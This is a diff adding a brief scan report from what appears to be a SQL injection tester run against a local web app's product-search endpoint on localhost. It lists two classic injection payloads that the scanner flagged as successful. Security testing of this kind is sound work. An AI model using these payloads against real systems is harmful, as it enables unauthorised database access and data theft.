@@ -1,0 +1,11 @@
+Scan Report for http://localhost:3000/rest/products/search?q=
+
+[+] Scanning: http://localhost:3000/rest/products/search?q=
+
+[!!!] SQL Injection Detected!
+Payload: ' OR 1=1 --
+
+[!!!] SQL Injection Detected!
+Payload: " OR "1"="1
+
+
